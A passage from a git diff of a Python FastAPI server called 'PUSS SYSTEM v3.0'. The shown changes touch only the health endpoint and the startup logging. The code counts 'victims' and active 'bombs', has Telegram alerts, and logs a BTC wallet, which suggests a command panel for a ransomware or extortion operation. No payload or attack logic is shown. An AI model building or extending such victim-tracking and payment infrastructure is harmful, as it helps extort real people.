+        'logs': db.get_logs(50)
+    }
+
 # ============================================================================
-# HEALTH
+# HEALTH CHECK
 # ============================================================================
 
 @app.get('/health')
@@ -827,7 +1122,9 @@ async def health():
         'status': 'ok',
         'time': datetime.now().isoformat(),
         'victims': len(db.victims),
-        'bombs': len(bomb_manager.active_bombs)
+        'bombs': len(bomb_manager.get_all()),
+        'telegram': telegram.enabled,
+        'version': '3.0.0'
     }
 
 # ============================================================================
@@ -836,10 +1133,22 @@ async def health():
 
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 8000))
-    logger.info("="*50)
+    host = os.environ.get('HOST', '0.0.0.0')
+    
+    logger.info("=" * 50)
     logger.info("PUSS SYSTEM v3.0")
+    logger.info("=" * 50)
     logger.info(f"Port: {port}")
+    logger.info(f"Host: {host}")
     logger.info(f"Victims: {len(db.victims)}")
     logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
-    logger.info("="*50)
-    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False)
+    logger.info(f"Wallet: {Config.BTC_WALLET}")
+    logger.info("=" * 50)
+    
+    uvicorn.run(
+        "main:app",
+        host=host,
+        port=port,
+        log_level=Config.LOG_LEVEL.lower(),
+        reload=Config.ENVIRONMENT == 'development'
+    )
